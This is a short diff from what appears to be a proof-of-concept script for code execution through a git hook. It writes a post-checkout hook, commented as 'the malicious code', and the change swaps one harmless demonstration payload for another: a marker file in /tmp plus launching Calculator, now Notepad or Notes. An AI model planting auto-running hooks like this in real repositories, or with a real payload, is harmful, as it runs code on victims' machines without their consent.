@@ -18,9 +18,9 @@ mkdir -p y/hooks
 # Write the malicious code to a hook
 cat > y/hooks/post-checkout <<EOF
 #!/bin/bash
-echo "amal_was_here" > /tmp/pwnd
-calc.exe
-open -a Calculator.app
+echo "YOU_HAVE_BEEN_POXEKED" > /tmp/pwnd
+notepad.exe
+open -a Notes.app
 EOF
 
 # Make the hook executable: important
